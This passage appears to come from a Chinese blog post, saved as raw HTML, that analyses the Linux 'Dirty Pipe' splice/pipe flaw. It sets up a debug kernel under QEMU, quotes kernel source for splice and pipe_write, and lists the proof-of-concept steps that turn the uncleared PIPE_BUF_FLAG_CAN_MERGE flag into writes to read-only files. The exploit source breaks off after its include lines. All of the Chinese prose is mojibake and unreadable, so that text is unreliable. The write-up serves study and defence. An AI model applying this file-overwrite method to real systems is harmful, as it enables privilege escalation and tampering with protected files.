å®‰è£…</span><br></pre></td></tr></table></figure>\n<p>è¿™å¾—è€åŠå¤©äº†</p>\n<h2 id=\"linux\"><a class=\"markdownIt-Anchor\" href=\"#linux\">#</a> Linux</h2>\n<p>é€‰ç”¨ v5.13-rc1 ç‰ˆæœ¬</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget https://github.com/torvalds/linux/archive/refs/tags/v5.13-rc1.tar.gz</span><br><span class=\"line\">make menuconfig </span><br><span class=\"line\">cat /proc/cpuinfo| grep &quot;cpu cores&quot; | uniq # check cpu core counts</span><br><span class=\"line\">make bzImage -j4</span><br></pre></td></tr></table></figure>\n<p>æ‰£ y é€‰ä¸­</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">kernel hacking -&gt;compile-time checks and compiler opt -&gt; compile the kernel with debug info</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t-&gt; Provide GDB scripts for kernel debugging</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t-&gt; Generate readable assembler code               </span><br><span class=\"line\">kernel hacking -&gt; compile the kernel with frame pointers (æ²¡æ‰¾åˆ°)</span><br><span class=\"line\">kernel hacking -&gt; Generic Kernel Debugging Instruments -&gt; KGDB: kernel debugger -&gt;</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tKGDB: use kgdb over the serial console (NEW)</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t\t\t\t</span><br></pre></td></tr></table></figure>\n<p>ç„¶åè®°å¾—ä¿è¯ä»¥ä¸‹å‡ ä¸ªä¹Ÿæ‰“å¼€äº†</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CONFIG_DEBUG_INFO_DWARF4=y</span><br></pre></td></tr></table></figure>\n<p>ç„¶åéšä¾¿æ‰¾ä¸ª ctf çš„æ–‡ä»¶ç³»ç»Ÿå°±è¡Œ æˆ–è€… busybox ç¼–è¯‘ã€‚</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cpio -idmv &lt; ../rootfs.img #è§£åŒ…cpio</span><br><span class=\"line\">find . | cpio -o --format=newc &gt; ../rootfs.img #æ‰“åŒ…cpio</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">qemu-system-x86_64 \\</span><br><span class=\"line\">\t-m 256M \\</span><br><span class=\"line\">\t-kernel ./arch/x86/boot/bzImage \\</span><br><span class=\"line\">\t-initrd ./rootfs.img \\</span><br><span class=\"line\">\t-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet nokaslr&quot; \\</span><br><span class=\"line\">\t-cpu qemu64 \\</span><br><span class=\"line\">\t-nographic \\</span><br><span class=\"line\">\t-net nic,model=virtio \\</span><br><span class=\"line\">\t-net user \\</span><br><span class=\"line\">\t-s \\</span><br><span class=\"line\">\t-S</span><br></pre></td></tr></table></figure>\n<h1 id=\"é™æ€åˆ†æ\"><a class=\"markdownIt-Anchor\" href=\"#é™æ€åˆ†æ\">#</a> é™æ€åˆ†æ</h1>\n<h4 id=\"spliceå‡½æ•°\"><a class=\"markdownIt-Anchor\" href=\"#spliceå‡½æ•°\">#</a> splice å‡½æ•°</h4>\n<p>åœ¨ä¸¤ä¸ª fd ä¸­ç§»åŠ¨æ•°æ® ä¸ºé›¶æ‹·è´æ“ä½œ<br>\næ¯”å¦‚è¦å®ç° fp1 åˆ° fp2 çš„æ•°æ®æ‹·è´ æ­£å¸¸æ¥è¯´æ˜¯è¦ç»å† <code>kernel space -&gt; user space -&gt; kernel space</code> <br>\n ç”¨ splice å°±å¯ä»¥å˜æˆ <code>fp1 -&gt; pipe_read -&gt; pipe_write -&gt; fp2</code></p>\n<p>å°† fd_in ä¼ é€’åˆ°æ–‡ä»¶æè¿°ç¬¦ fd_outï¼Œå…¶ä¸­æ–‡ä»¶æè¿°ç¬¦ä¹‹ä¸€å¿…é¡»å¼•ç”¨ç®¡é“ã€‚<br>\n <code>splice</code> Â çš„é›¶æ‹·è´æ–¹æ³•å°±æ˜¯ï¼Œç›´æ¥ç”¨æ–‡ä»¶ç¼“å­˜é¡µæ¥æ›¿æ¢ <code>pipe</code> Â ä¸­çš„ç¼“å­˜é¡µ (æ›´æ”¹ pipe ç¼“å­˜é¡µæŒ‡é’ˆæŒ‡å‘æ–‡ä»¶ç¼“å­˜é¡µ)ã€‚<br>\nä¹Ÿå°±æ˜¯å®é™…ä¸Šä¸éœ€è¦ç»è¿‡æŠŠæˆ‘ä»¬çš„è¾“å…¥æ‹·è´åˆ° pipe è¿™ä¸€æ­¥ï¼Œç›´æ¥æŠŠæˆ‘ä»¬æ•°æ®çš„ç¼“å­˜é¡µçš„ä½ç½®ç»™åˆ°éœ€è¦ç”¨åˆ°è¿™ä¸ªçš„ fd å°±è¡Œäº†ã€‚ï¼ˆå› ä¸º pipe å°±æ˜¯ä¸€ç«¯å†™å…¥ä¸€ç«¯è¯»å…¥ï¼Œæˆ‘å¦‚æœæŠŠæ–‡ä»¶å†…å®¹å†™å…¥ç®¡é“ç¼“å†²åŒºï¼Œç„¶åå†ä»ç®¡é“ç¼“å†²åŒºå†™å‡ºï¼Œä¸å¦‚åœ¨ç®¡é“ç¼“å†²åŒºçš„æ—¶å€™ç›´æ¥è®© buffer çš„ page æŒ‡å‘åŸæ¥é‚£ä¸ªé¡µçš„å†…å­˜ç¼“å­˜é¡µï¼Œè¿™æ ·å°±å°‘äº† copy é‚£ä¸€æ­¥ï¼‰</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">ssize_t</span> <span class=\"title function_\">splice</span><span class=\"params\">(<span class=\"type\">int</span> fd_in, <span class=\"type\">loff_t</span> *off_in, <span class=\"type\">int</span> fd_out,</span></span><br><span class=\"line\"><span class=\"params\">               <span class=\"type\">loff_t</span> *off_out, <span class=\"type\">size_t</span> len, <span class=\"type\">unsigned</span> <span class=\"type\">int</span> flags)</span>;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>If fd_in refers to a pipe, then off_in must be NULL</li>\n<li>If fd_in does not refer to a pipe and off_in is NULL, then bytes are read from fd_in starting from the file offset, and the file offset is adjusted appropriately.</li>\n</ul>\n<p>splice æœ€ç»ˆä¼šè°ƒç”¨ <code>copy_page_to_iter_pipe</code>  å‡½æ•°<br>\nè€Œè¿™ä¸ªå‡½æ•°å¹¶æ²¡æœ‰æ¸…é™¤ <code>PIPE_BUF_FLAG_CAN_MERGE</code>  ä½<br>\n iov_iter æºå¸¦äº†æˆ‘ä»¬å†™å…¥çš„é‚£ä¸ªç®¡é“ è€Œè¿™ä¸ªç®¡é“çš„å¤´éƒ¨ buf è¢«æŒ‡å‘äº†æˆ‘ä»¬é€å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•° pageï¼Œè¿™ä¸ª page æ˜¯å†…å­˜ç¼“å­˜é¡µçš„å†…å®¹ã€‚</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">size_t</span> <span class=\"title function_\">copy_page_to_iter_pipe</span><span class=\"params\">(<span class=\"keyword\">struct</span> page *page, <span class=\"type\">size_t</span> offset, <span class=\"type\">size_t</span> bytes,</span></span><br><span class=\"line\"><span class=\"params\">\t\t\t <span class=\"keyword\">struct</span> iov_iter *i)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">pipe_inode_info</span> *<span class=\"title\">pipe</span> =</span> i-&gt;pipe;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">pipe_buffer</span> *<span class=\"title\">buf</span>;</span></span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">int</span> p_tail = pipe-&gt;tail;</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">int</span> p_mask = pipe-&gt;ring_size - <span class=\"number\">1</span>;</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">int</span> i_head = i-&gt;head;</span><br><span class=\"line\">\t<span class=\"type\">size_t</span> off;</span><br><span class=\"line\"></span><br><span class=\"line\">\t(Â·Â·Â·)</span><br><span class=\"line\"></span><br><span class=\"line\">\tbuf = &amp;pipe-&gt;bufs[i_head &amp; p_mask];</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t(Â·Â·Â·)</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">/* é‡ç‚¹ bufçš„opsæŒ‡å‘äº†æ–‡ä»¶ç¼“å­˜é¡µ */</span></span><br><span class=\"line\">\tbuf-&gt;ops = &amp;page_cache_pipe_buf_ops;</span><br><span class=\"line\">\tget_page(page);</span><br><span class=\"line\">\tbuf-&gt;page = page;<span class=\"comment\">/* ç›´æ¥æŒ‡å‘äº†æ–‡ä»¶ç¼“å­˜é¡µ */</span></span><br><span class=\"line\">\tbuf-&gt;offset = offset;</span><br><span class=\"line\">\tbuf-&gt;len = bytes;</span><br><span class=\"line\"></span><br><span class=\"line\">\tpipe-&gt;head = i_head + <span class=\"number\">1</span>;</span><br><span class=\"line\">\ti-&gt;iov_offset = offset + bytes;</span><br><span class=\"line\">\ti-&gt;head = i_head;</span><br><span class=\"line\">out:</span><br><span class=\"line\">\ti-&gt;count -= bytes;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> bytes;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"pipe_writeåˆ†æ\"><a class=\"markdownIt-Anchor\" href=\"#pipe_writeåˆ†æ\">#</a> pipe_write åˆ†æ</h4>\n<p>åˆ©ç”¨çš„ç‚¹æ˜¯ pipe è¢«åˆå§‹åŒ–ç”³è¯·ä¼šé»˜è®¤è®¾ç½® flag ä¸º <code>PIPE_BUF_FLAG_CAN_MERGE</code></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">ssize_t</span></span><br><span class=\"line\"><span class=\"title function_\">pipe_write</span><span class=\"params\">(<span class=\"keyword\">struct</span> kiocb *iocb, <span class=\"keyword\">struct</span> iov_iter *from)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">file</span> *<span class=\"title\">filp</span> =</span> iocb-&gt;ki_filp;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">pipe_inode_info</span> *<span class=\"title\">pipe</span> =</span> filp-&gt;private_data;</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">int</span> head;</span><br><span class=\"line\">\t<span class=\"type\">ssize_t</span> ret = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"type\">size_t</span> total_len = iov_iter_count(from);</span><br><span class=\"line\">\t<span class=\"type\">ssize_t</span> chars;</span><br><span class=\"line\">\t<span class=\"type\">bool</span> was_empty = <span class=\"literal\">false</span>;</span><br><span class=\"line\">\t<span class=\"type\">bool</span> wake_next_writer = <span class=\"literal\">false</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t(Â·Â·Â·)</span><br><span class=\"line\"></span><br><span class=\"line\">\thead = pipe-&gt;head; <span class=\"comment\">// è·å–å¤´ç»“ç‚¹ headæ˜¯intç±»å‹ </span></span><br><span class=\"line\">\t<span class=\"comment\">// pipeæ˜¯å¾ªç¯é“¾è¡¨ç»“æ„ å¦‚æœhead == tail ä»£è¡¨ç©ºäº†</span></span><br><span class=\"line\">\twas_empty = pipe_empty(head, pipe-&gt;tail);</span><br><span class=\"line\">\t<span class=\"comment\">// charså°±æ˜¯æ•°æ®é•¿åº¦</span></span><br><span class=\"line\">\tchars = total_len &amp; (PAGE_SIZE<span class=\"number\">-1</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">/* å¦‚æœæœ‰é•¿åº¦ä¸”ç®¡é“ä¸ä¸ºç©º */</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (chars &amp;&amp; !was_empty) &#123;</span><br><span class=\"line\">\t\t<span class=\"type\">unsigned</span> <span class=\"type\">int</span> mask = pipe-&gt;ring_size - <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t<span class=\"comment\">// bufæŒ‡å‘ç®¡é“çš„ç¼“å†²åŒº</span></span><br><span class=\"line\">\t\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">pipe_buffer</span> *<span class=\"title\">buf</span> =</span> &amp;pipe-&gt;bufs[(head - <span class=\"number\">1</span>) &amp; mask];</span><br><span class=\"line\">\t\t<span class=\"type\">int</span> offset = buf-&gt;offset + buf-&gt;len;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"comment\">/* â˜† æ­¤å¤„é‡ç‚¹ â˜†</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\tå¦‚æœflagsæ ‡å¿—ä½ä¸º PIPE_BUF_FLAG_CAN_MERGE</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\tå¹¶ä¸”å½“å‰bufå·²ç»å†™è¿‡çš„offsetåŠ ä¸Šå³å°†å†™çš„charsçš„å¤§å°å°äºPSIZE</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\tå°±ä¼šç»§ç»­å†™</span></span><br><span class=\"line\"><span class=\"comment\">\t\t */</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> ((buf-&gt;flags &amp; PIPE_BUF_FLAG_CAN_MERGE) &amp;&amp;</span><br><span class=\"line\">\t\t    offset + chars &lt;= PAGE_SIZE) &#123;</span><br><span class=\"line\">\t\t   <span class=\"comment\">// éªŒè¯æ•°æ®å­˜åœ¨ å’ŒIOé˜»å¡ç›¸å…³ è¿”å›0ä»£è¡¨æ­£å¸¸</span></span><br><span class=\"line\">\t\t\tret = pipe_buf_confirm(pipe, buf);</span><br><span class=\"line\">\t\t\t(Â·Â·Â·)</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t<span class=\"comment\">// æ­¤å‡½æ•°å°±æ˜¯å¾€ç®¡é“çš„bufæ‰€åœ¨çš„é¡µå†™æ•°æ®äº† å¦‚æœå†™äº†ä¹‹åä¼šç›´æ¥go out ä¸ä¼šèµ°ä¸‹é¢çš„for(;;)</span></span><br><span class=\"line\">\t\t\tret = copy_page_from_iter(buf-&gt;page, offset, chars, from);</span><br><span class=\"line\">\t\t\t(Â·Â·Â·)</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\tbuf-&gt;len += ret;</span><br><span class=\"line\">\t\t\t(Â·Â·Â·)</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">// ä¸Šä¸€é¡µä¸èƒ½æ¥ç€å†™çš„æƒ…å†µ å°±æ˜¯æœ¬åº”è¯¥èµ°çš„æ­£å¸¸æƒ…å†µ</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (;;) &#123;</span><br><span class=\"line\">\t\t(Â·Â·Â·)</span><br><span class=\"line\"></span><br><span class=\"line\">\t\thead = pipe-&gt;head;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (!pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage)) &#123;</span><br><span class=\"line\">\t\t\t<span class=\"type\">unsigned</span> <span class=\"type\">int</span> mask = pipe-&gt;ring_size - <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">pipe_buffer</span> *<span class=\"title\">buf</span> =</span> &amp;pipe-&gt;bufs[head &amp; mask];</span><br><span class=\"line\">\t\t\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">page</span> *<span class=\"title\">page</span> =</span> pipe-&gt;tmp_page;</span><br><span class=\"line\">\t\t\t<span class=\"type\">int</span> copied;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t<span class=\"comment\">// é‡æ–°ç”³è¯·ä¸€ä¸ªpage</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (!page) &#123;</span><br><span class=\"line\">\t\t\t\tpage = alloc_page(GFP_HIGHUSER | __GFP_ACCOUNT);</span><br><span class=\"line\">\t\t\t\t</span><br><span class=\"line\">\t\t\t\t(Â·Â·Â·)</span><br><span class=\"line\">\t\t\t\t</span><br><span class=\"line\">\t\t\t\tpipe-&gt;tmp_page = page;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\tspin_lock_irq(&amp;pipe-&gt;rd_wait.lock);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\thead = pipe-&gt;head;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage)) &#123;</span><br><span class=\"line\">\t\t\t\tspin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">continue</span>;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\tpipe-&gt;head = head + <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t\tspin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t<span class=\"comment\">/* Insert it into the buffer array */</span></span><br><span class=\"line\">\t\t\t<span class=\"comment\">/* é‡ç‚¹ åˆå§‹åŒ–é˜¶æ®µ */</span></span><br><span class=\"line\">\t\t\tbuf = &amp;pipe-&gt;bufs[head &amp; mask];</span><br><span class=\"line\">\t\t\tbuf-&gt;page = page;</span><br><span class=\"line\">\t\t\tbuf-&gt;ops = &amp;anon_pipe_buf_ops;</span><br><span class=\"line\">\t\t\tbuf-&gt;offset = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t\tbuf-&gt;len = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (is_packetized(filp))</span><br><span class=\"line\">\t\t\t\tbuf-&gt;flags = PIPE_BUF_FLAG_PACKET;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">else</span><span class=\"comment\">// â˜† é»˜è®¤è®¾ç½®flagä¸º PIPE_BUF_FLAG_CAN_MERGE</span></span><br><span class=\"line\">\t\t\t\tbuf-&gt;flags = PIPE_BUF_FLAG_CAN_MERGE;</span><br><span class=\"line\">\t\t\tpipe-&gt;tmp_page = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\tcopied = copy_page_from_iter(page, <span class=\"number\">0</span>, PAGE_SIZE, from);</span><br><span class=\"line\">\t\t\t(Â·Â·Â·)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"pocåˆ†æ\"><a class=\"markdownIt-Anchor\" href=\"#pocåˆ†æ\">#</a> POC åˆ†æ</h3>\n<ul>\n<li>ä½œè€…é¦–å…ˆå¡«æ»¡äº† 16 ä¸ª PIPEï¼Œå°† flag éƒ½é»˜è®¤è®¾ç½®ä¸º <code>PIPE_BUF_FLAG_CAN_MERGE</code></li>\n<li>ç„¶åè¯»å– æ¸…ç©º pipe</li>\n<li>ç”¨ open æ‰“å¼€å¯¹åº”æ–‡ä»¶ï¼Œåªè¯»å³å¯ è¿™æ ·å°±å°†æ–‡ä»¶æ”¾åˆ°ç¼“å­˜é¡µé‡Œäº†</li>\n<li>splice ç³»ç»Ÿè°ƒç”¨å°†å¯¹åº”çš„ç®¡é“çš„ buf å’Œæ–‡ä»¶ç¼“å­˜é¡µç»‘å®šåœ¨ä¸€èµ·</li>\n<li>åˆ©ç”¨ splice ä¸åˆå§‹åŒ– <code>PIPE_BUF_FLAG_CAN_MERGE</code>  çš„ç‰¹æ€§ ç»§ç»­å¾€ç®¡é“é‡Œå†™å…¥ å°±å†™å…¥åˆ°äº†å¯¹åº”çš„æ–‡ä»¶ç¼“å­˜åŒºäº†<br>\nè¿™å°±é€ æˆäº†ä¸€ä¸ªä»»æ„æ–‡ä»¶å†™çš„æ¼æ´</li>\n</ul>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> _GNU_SOURCE</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;fcntl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/stat.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/user.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span 